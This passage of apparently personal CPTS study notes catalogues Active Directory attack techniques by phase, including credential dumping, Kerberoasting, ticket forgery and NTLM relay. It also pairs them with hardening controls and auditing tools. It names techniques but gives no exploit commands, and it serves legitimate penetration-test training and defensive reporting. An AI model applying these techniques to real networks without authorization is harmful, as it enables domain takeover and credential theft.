The full menu. Commands for the core ones are in the attack-flow above; this is the map so I know what exists and when it applies. **CPTS focus = the post-access AD attacks** (credential dumping → privesc → lateral → persistence). Initial-access social/physical and Azure/cloud items are mostly red-team / cloud scope — know the names, but they're outside core CPTS.

**1. Initial access** (mostly red-team scope): phishing, malicious macros, credential stuffing, pass-the-cookie, malicious USB/Rubber Ducky, exposed SMB shares, VPN cred hijack, zero-day (e.g. Log4Shell), **LLMNR/NBT-NS poisoning** (Responder — this one *is* core), evil twin, watering hole, supply chain.

**2. Credential dumping:** Mimikatz (LSASS), **DCSync**, LSASS dump, SAM/SYSTEM hive, Kerberos ticket extraction, **NTDS.dit** dump, WDigest, cached creds (mscache), browser creds, DPAPI.

**3. Privilege escalation:** **Kerberoasting**, **AS-REP roasting**, token impersonation, Pass-the-Hash, **Print Spooler / PrintNightmare**, unconstrained/constrained delegation abuse, local privesc (CVEs → modules 25/26), SeBackup/SeRestorePrivilege, S4U2Self/S4U2Proxy, DNSAdmins DLL load, **AD CS abuse (ESC1-8)**.

**4. Lateral movement:** PtH, Pass-the-Ticket, SMB relay, PsExec, RDP hijack, WMI, BloodHound (path-finding), DCOM, WinRM, Printer Bug, **PetitPotam**, domain/forest trust abuse.

**5. Persistence / domain takeover:** **Golden Ticket** (krbtgt), **Silver Ticket** (service), Skeleton Key, AdminSDHolder, GPO hijack, SID history injection, **Shadow Credentials**, **RBCD**, DCShadow, WMI event sub, registry run keys, AD Recycle Bin, ADFS token forgery, Azure AD Connect.

**6. NTLM & Kerberos protocol attacks:** NTLM relay, NTLMv1 downgrade, Kerberos downgrade, **Overpass-the-Hash**, pre-auth brute force, PAC tampering, TGT delegation, **Bronze Bit (CVE-2020-17049)**, LDAP relay.

**7. Data exfil / domain persistence:** ldapdomaindump, **GPP cpassword** (Groups.xml in SYSVOL), LSA secrets, SYSVOL creds, MSSQL (AD-integrated) privesc, VSS shadow copy, cloud sync, ADFS cert theft, Azure AD.

**8. Misc:** PowerView recon, AD object/ACL permission abuse, unconstrained delegation TGT capture.

> Bolded = the ones that actually come up most in CPTS/internal pentests. If I learn this column cold — LLMNR poisoning, Kerberoasting, AS-REP, DCSync, PtH, Golden/Silver ticket, delegation, AD CS, GPP cpassword — I've got the exam's AD surface covered.

## Further learning & resources (module close)
Why AD matters: it mirrors real day-to-day internal pentesting, and it's the launchpad for hybrid/cloud (Azure AD) work.

**Practice boxes (retired HTB AD — do these):** Forest, Active, Reel, Mantis, Blackfield, Monteverde. Also: Intro to Zephyr, Pro Labs **Dante** & **Offshore**, Endgame **Ascension**.

**Related HTB modules to pair:** AD BloodHound, AD LDAP & PowerView, Cracking Passwords with Hashcat (module 10 here).

**Talks worth watching:** "Six Degrees of Domain Admin" (DEF CON 24), "Designing AD DACL Backdoors" (Schroeder/Robbins), "Kicking the Guard Dog of Hades", "Kerberoasting 101" (Tim Medin).

**People/blogs to follow:** 0xdf, SpecterOps, harmj0y, ADSecurity (Sean Metcalf), Shenaniganslabs, Dirk-jan Mollema, The DFIR Report. Reference framework: **MITRE ATT&CK**.

> My move: after filling these notes, actually pwn Forest and Active (easy AD boxes), compare to 0xdf / IppSec write-ups, and log my own commands in the section below.

## AD Hardening & Auditing (defense / report side)
The remediation half — most of this maps directly to the attacks above, which is exactly what a report needs.

**People:** strong password policy + filters; rotate service-account passwords (prefer **gMSA**); no local admin for users; disable the RID-500 built-in admin; **tiered administration**; restrict DA/EA membership; **Protected Users** group (blocks delegation, NTLM/RC4/DES, plaintext caching) for admins; disable delegation on admin accounts.

**Process:** asset management; provisioning/deprovisioning + MFA; gold-image baselines; stale-account cleanup; decommission legacy OS/services; scheduled audits.

**Technology (these kill specific attacks):**
| Control | Stops |
|---|---|
| `ms-DS-MachineAccountQuota = 0` | NoPac, RBCD (users can't add computers) |
| Disable Print Spooler (esp. DCs) | PrintNightmare, Printer Bug |
| SMB signing + LDAP signing/channel binding | NTLM relay, poisoning |
| Disable NTLM on DCs; EPA + Require SSL on CA | PetitPotam → AD CS relay |
| gMSA + AES (no RC4) | Kerberoasting |
| No passwords in descriptions; scrub SYSVOL | GPP cpassword, quick-win loot |
| Disable unconstrained delegation | TGT theft |
| RestrictNullSessAccess | null-session enum |
| Run BloodHound/PingCastle/Grouper yourself | find it before attackers do |

**MITRE ATT&CK mapping (for findings):** external recon T1589, poisoning T1557, password spraying T1110.003, Kerberoasting T1558.003, etc. Citing the technique ID makes a finding traceable.

## AD auditing tools (defensive enumeration)
- **AD Explorer** (Sysinternals) — browse AD, edit objects, and **snapshot** the DB for offline before/after comparison.
- **PingCastle** — scores AD security posture, maps, health-check reports (great for the report). (Tool quirk: if it won't run, set system date before 2023-07-31.)
- **Group3r** — finds Group Policy vulns (`group3r.exe -f out.log`); catches GPO issues others miss.
- **ADRecon** — dumps *everything* (users, groups, GPOs, trusts, password policy, LAPS, BitLocker) to HTML/CSV; loud but thorough when stealth isn't needed.

> Every attack in this module has a control that kills it. Pairing "here's how I got DA" with "here's the one setting that stops it" (e.g. Kerberoast → gMSA, NoPac → MachineAccountQuota 0) is what a senior-level report reads like.
